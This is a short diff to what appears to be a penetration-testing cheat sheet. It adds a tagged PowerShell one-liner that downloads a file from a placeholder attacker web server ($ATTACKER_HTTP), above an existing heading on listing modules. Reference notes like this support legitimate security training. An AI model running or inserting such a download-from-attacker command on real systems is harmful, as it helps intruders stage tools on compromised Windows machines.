@@ -1,4 +1,13 @@
 
+Common utilities:
+----
+Download file from web server, invoke web request:
+#powershell #powershell-download #powershell-wget #iwr #invoke-web-request
+
+```powershell
+IWR -uri $ATTACKER_HTTP/$FILE -Outfile $FILE
+```
+
 Get list  of all available modules:
 ---
 #windows #modules #powershell 
